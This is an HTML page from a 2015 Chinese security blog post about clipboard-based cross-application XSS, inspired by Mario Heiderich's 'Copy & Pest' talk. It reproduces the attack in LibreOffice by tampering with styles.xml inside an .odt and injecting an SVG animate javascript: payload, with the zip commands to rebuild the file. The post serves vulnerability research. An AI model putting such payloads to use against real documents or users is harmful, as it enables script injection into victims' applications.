@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>跨站世界中有趣的复制与粘贴 - Linux.im</title>
+    <meta name="description" content="Hacking for fun. - evi1m0"/>
+    <link rel="stylesheet" href="/css/linux-im.css" type="text/css" />
+    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
+  </head>
+  <body>
+    <style>
+      h1 {
+        font-family: STFangSong, Helvetica, Arial, Vernada, Tahoma, STXihei, "Microsoft YaHei", "Songti SC", SimSun, Heiti, sans-serif;
+      }
+    </style>
+    <div class="site">
+      <div class="post-content" style="margin-top: -20px;">
+        <div id="post">
+          <h1 id="section">跨站世界中有趣的复制与粘贴</h1>
+<p class="date">08 Apr 2015 - evi1m0</p>
+
+<p>Mario Heiderich 在 2015-03-30 发表了名为《Copy &amp; Pest - A case-study on the clipboard, blind trust and invisible cross-application XSS》的 PPT ，地址：<a href="http://www.slideshare.net/x00mario/copypest">http://www.slideshare.net/x00mario/copypest</a></p>
+
+<p>PPT 讲述了几个部分：</p>
+
+<ul>
+  <li>为什么会出现这种问题？</li>
+  <li>为什么问题会出现在这里？</li>
+  <li>我们能够做些什么？</li>
+  <li>谁需要修复这些问题？</li>
+  <li>…</li>
+</ul>
+
+<p>我在10年使用阿里旺旺时发现从 Office 中复制过来的内容巧妙的在输入框内保持了原有样式，虽知可能会存在一些问题，但简单的折腾了下并未能真正做出复制与粘贴风险的DEMO，马里奥这个比较有意思，另外这里的复制粘贴与富文本有那么点儿相似，但却大不同。</p>
+
+<ul>
+  <li><a href="http://server.n0tr00t.com/tools/copypaste.html">http://server.n0tr00t.com/tools/copypaste.html</a> @html5sec</li>
+</ul>
+
+<p>上面小脚本能将剪切板中的内容解析出来，例如我们使用 Word 编辑文字后并粘贴到 [3rd: and paste is here] 区域：</p>
+
+<p><img src="http://ww2.sinaimg.cn/large/c334041bgw1eqy8r2xhttj213h0f7acd.jpg" alt="http://ww2.sinaimg.cn/large/c334041bgw1eqy8r2xhttj213h0f7acd.jpg" /></p>
+
+<pre><code>&lt;!--[if gte mso 10]&gt;
+&lt;style&gt;
+ /* Style Definitions */
+table.MsoNormalTable
+    {mso-style-name:"Table Normal";
+    mso-tstyle-rowband-size:0;
+    mso-tstyle-colband-size:0;
+    mso-style-noshow:yes;
+    mso-style-priority:99;
+    mso-style-parent:"";
+    mso-padding-alt:0cm 5.4pt 0cm 5.4pt;
+    mso-para-margin:0cm;
+    mso-para-margin-bottom:.0001pt;
+    mso-pagination:widow-orphan;
+    font-size:12.0pt;
+    font-family:Cambria;
+    mso-ascii-font-family:Cambria;
+    mso-ascii-theme-font:minor-latin;
+    mso-hansi-font-family:Cambria;
+    mso-hansi-theme-font:minor-latin;
+    mso-fareast-language:ZH-CN;}
+&lt;/style&gt;
+&lt;![endif]--&gt;
+
+&lt;!--StartFragment--&gt;
+&lt;p class="MsoNormal"&gt;&lt;b&gt;&lt;span style="font-size:28.0pt;font-family:&amp;quot;Apple Chancery&amp;quot;;color:red"&gt;Linux.im&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;
+&lt;!--EndFragment--&gt;
+</code></pre>
+
+<p>眼见并不为真，来对已经公开的案例进行重现（LibreOffice Writer for Ubuntu）：</p>
+
+<ol>
+  <li>新建 OpenOffice odt 文档</li>
+  <li>修改为压缩包格式</li>
+  <li>篡改 odt 目录结构中的 XML</li>
+  <li>无损恢复成原始文档</li>
+</ol>
+
+<h5 id="section-1">创建文档</h5>
+
+<p><img src="http://ww4.sinaimg.cn/large/c334041bgw1eqy966a4btj21fc0d542b.jpg" alt="http://ww4.sinaimg.cn/large/c334041bgw1eqy966a4btj21fc0d542b.jpg" /></p>
+
+<p>此时复制解析后的 text/html 代码为：</p>
+
+<pre><code>&lt;style type="text/css"&gt;H1 { margin-bottom: 0.08in; }H1.western { font-family: "Liberation Sans",sans-serif; font-size: 16pt; }H1.cjk { font-family: "WenQuanYi Micro Hei"; font-size: 16pt; }H1.ctl { font-family: "Lohit Hindi"; font-size: 16pt; }P { margin-bottom: 0.08in; }&lt;/style&gt;
+
+&lt;h1 class="western"&gt;&lt;font color="#800000"&gt;&lt;font style="font-size: 28pt" size="6"&gt;&lt;span style="background: #ffff00"&gt;Linux.im: Please copy me =)&lt;/span&gt;&lt;/font&gt;&lt;/font&gt;&lt;/h1&gt;
+</code></pre>
+
+<h5 id="section-2">修改格式</h5>
+
+<p><img src="http://ww3.sinaimg.cn/large/c334041bgw1eqy9a2zgzjj20ka0hyae6.jpg" alt="http://ww3.sinaimg.cn/large/c334041bgw1eqy9a2zgzjj20ka0hyae6.jpg" /></p>
+
+<h5 id="stylesxml">篡改 styles.xml</h5>
+
+<pre><code>&lt;style type="text/css"&gt;H1 { margin-bottom: 0.08in; }H1.western { font-family: "Liberation Sans",sans-serif; font-size: 16pt; }H1.cjk { font-family: "WenQuanYi Micro Hei"; font-size: 16pt; }H1.ctl { font-family: "Lohit Hindi"; font-size: 16pt; }P { margin-bottom: 0.08in; }&lt;/style&gt;
+</code></pre>
+
+<p>寻找可控点为 font-family ，篡改对应的 styles 样式文件，闭合标签并植入恶意 Payload：</p>
+
+<pre><code>&amp;lt;/style&amp;gt;&amp;lt;div contenteditable=false&amp;gt;&amp;lt;svg&amp;gt;&amp;lt;style&amp;gt;svg {position:fixed}&amp;lt;/style&amp;gt;&amp;lt;style&amp;gt;svg {top:0}&amp;lt;/style&amp;gt;&amp;lt;style&amp;gt;svg {left:0}&amp;lt;/style&amp;gt; &amp;lt;style&amp;gt;svg {height:10000px}&amp;lt;/style&amp;gt; &amp;lt;style&amp;gt;svg {width:10000px}&amp;lt;/style&amp;gt; &amp;lt;style&amp;gt;svg {opacity:0}&amp;lt;/style&amp;gt; &amp;lt;a xmlns:xlink=&amp;quot;http://www.w3.org/1999/xlink&amp;quot; xlink:href=&amp;quot;?&amp;quot;&amp;gt; &amp;lt;circle r=&amp;quot;4000&amp;quot;&amp;gt;&amp;lt;/circle&amp;gt; &amp;lt;animate attributeName=&amp;quot;xlink:href&amp;quot; begin=&amp;quot;0&amp;quot; from=&amp;quot;javascript:alert(document.domain)&amp;quot; to=&amp;quot;&amp;amp;&amp;quot; /&amp;gt; &amp;lt;/a&amp;gt;1
+</code></pre>
+
+<h5 id="section-3">恢复原始文档</h5>
+
+<pre><code>_&gt; zip -u x1.zip
+_&gt; mv x1.zip x1.odt
+</code></pre>
+
+<p><img src="http://ww1.sinaimg.cn/large/c334041bgw1eqy9o9bhjbj21eq0jpjyw.jpg" alt="http://ww1.sinaimg.cn/large/c334041bgw1eqy9o9bhjbj21eq0jpjyw.jpg" /></p>
+
+<h5 id="section-4">其它</h5>
+
+<ul>
+  <li>Adobe Reader</li>
+  <li>Microsoft Office</li>
+  <li>XPS Viewer</li>
+  <li>…</li>
+</ul>
+
+<p>Mario PPT 中讲谈到了几个典型应用存在的类似问题，随后我又对 MS Office For MAC 等软件进行了挖掘，比较有趣的是 MS Office For MAC 版本中的 XSS Filter 耗费了我大量时间来 Bypass 过滤器，感兴趣的可以试一下。</p>
+
+<p>这种交互式跨站攻击虽稍有鸡肋，但在现实世界中可能仍会发生，期待未来的真实案例。</p>
+
+
+        </div>
+      </div>
+
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+        var disqus_shortname = 'evi1m0';
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+      <!-- footer -->
+      <div class="footer">
+        <div class="contact">
+          <p>
+            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
+            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
+            <a href="http://weibo.com/Evi1m0" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
+            <a href="mailto:evi1m0.bat@gmail.com">evi1m0.bat@gmail.com</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div style="display: none;">
+      <script src="http://s4.cnzz.com/z_stat.php?id=1254574847&web_id=1254574847" language="JavaScript"></script>
+    </div>
+  </body>
+</html>
